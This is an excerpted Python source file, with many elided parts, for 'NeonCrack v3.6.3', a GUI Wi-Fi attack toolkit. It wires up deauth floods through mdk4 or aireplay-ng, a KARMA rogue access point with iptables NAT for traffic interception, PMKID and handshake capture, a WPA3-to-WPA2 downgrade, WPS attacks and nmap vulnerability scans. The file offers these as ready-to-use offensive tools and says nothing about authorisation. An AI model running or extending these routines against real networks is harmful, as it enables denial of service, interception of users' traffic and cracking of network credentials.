#!/usr/bin/env python3
"""
NeonCrack v3.6.3 – cyber-punk Swiss-Army toolkit for Wi-Fi & net recon
──────────────────────────────────────────────────────────────────────
• Dragonblood WPA3→WPA2, KARMA rogue-AP, PMKID/handshake, WPS, deauth, nmap
• Scan-tab facelift (Dwell inline, Stop-Scan button)
• Sticky-Monitor toggle moved to new 🛠 Utilities tab
"""
...
root = Tk(); root.title("NeonCrack v3.6.3"); root.configure(bg=BGC); root.geometry("1080x850")
...
sticky_mon              = BooleanVar(value=False)      # lives in Utilities tab
...
# ────────────────── NAT helper (KARMA) ─────────────────────────────────────
def enable_nat(uplink, ap):
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=1"],
                   stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-t","nat","-F"])
    subprocess.run(["iptables","-t","nat","-A","POSTROUTING","-o",uplink,"-j","MASQUERADE"])
    subprocess.run(["iptables","-A","FORWARD","-i",uplink,"-o",ap,
                    "-m","state","--state","RELATED,ESTABLISHED","-j","ACCEPT"])
    subprocess.run(["iptables","-A","FORWARD","-i",ap,"-o",uplink,"-j","ACCEPT"])
...
# ─────── watchdog to reap orphaned attack processes every 10 min ───────────
def watchdog():
    global attack_proc
    while True:
        time.sleep(600)
...
def poll_bw(iface):
    try:
        ...
        log(utils_out, f"[!] iface {iface} not found → monitor stopped")
        bw_stop.set(); return
    ...
    while not bw_stop.is_set():
        ...
        try:
            ...
            log(utils_out,"[!] iface disappeared; stopping monitor")
            bw_stop.set(); break
...
def start_bw_monitor():
    ...
    if iface not in psutil.net_io_counters(pernic=True):
        messagebox.showerror("Bad iface", iface); return
...
def stop_bw_monitor():
    bw_stop.set(); log(utils_out,"[*] Monitor stopped")

# ─────────────────── CSV parsing & WPS detector ────────────────────────────
def parse_csv(path):
    nets=[]
...
# ─────────────────────── attack routines ──────────────────────────────────
def start_pmkid():
    t=pick_target(); iface=iface_var.get();                        # etc …
    if not t:return
...
def start_handshake():
    t=pick_target(); iface=iface_var.get();  # omitted details identical to 3.6.2
    if not t:return
    bssid,ch,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
...
def start_deauth():
    ...
    if shutil.which("mdk4"): cmd=["mdk4",mon,"d","-B",bssid]
    else: cmd=["aireplay-ng","--deauth","0","-a",bssid,mon]
    logf=os.path.join(CAP_DIR,f"deauth_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd,att_out,logf)
    log(att_out,"[*] Deauth flood – Stop to end")
...
def start_wpa3_downgrade():
    ...
    if "SAE" not in enc and "WPA3" not in enc:
        messagebox.showinfo("Not WPA3","AP isn’t advertising SAE"); return
    if shutil.which("dragondown") is None:
        messagebox.showerror("Missing dragondown",
            "Install dragondown.py (hashcat-utils) and put it in $PATH."); return
    set_monitor(iface,True); mon=iface_var.get()
...
def reset_toolkit(exit_after=False):
    ...
    for box in (scan_out,att_out,crack_out,hashid_out,utils_out):
        box.delete("1.0",END)
    for var in (target_var,pcap_var,word_var,hash_input,
...
OptionMenu(nrow,nmap_profile,"Quick Ping","Top-100 Ports","Full TCP","OS Detect",
           "Vuln Script","Custom").grid(row=0,column=2,padx=4)
custom_entry=Entry(nrow,textvariable=nmap_custom,width=22,state="disabled")
custom_entry.grid(row=0,column=3,padx=4)
def toggle(*_): custom_entry.config(state="normal" if nmap_profile.get()=="Custom" else "disabled")
nmap_profile.trace_add("write",toggle)
Button(nrow,text="Run nmap",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=start_nmap_scan,daemon=True).start()).grid(row=0,column=4,padx=4)
...
# ─── Utilities tab (stats + sticky monitor) ────────────────────────────────
ut=tabs["utils"]
Checkbutton(ut,text="Sticky Monitor (keep iface in monitor mode)",
            variable=sticky_mon,onvalue=True,offvalue=False,
...
utils_out=scrolledtext.ScrolledText(ut,width=115,height=12,bg="#0d0d17",
                                    fg=NEON,font=("Consolas",10))
utils_out.pack()
bw_frame=Frame(ut,bg=BGC); bw_frame.pack(pady=10,fill=X)
...
canvas=FigureCanvasTkAgg(fig,master=ut)
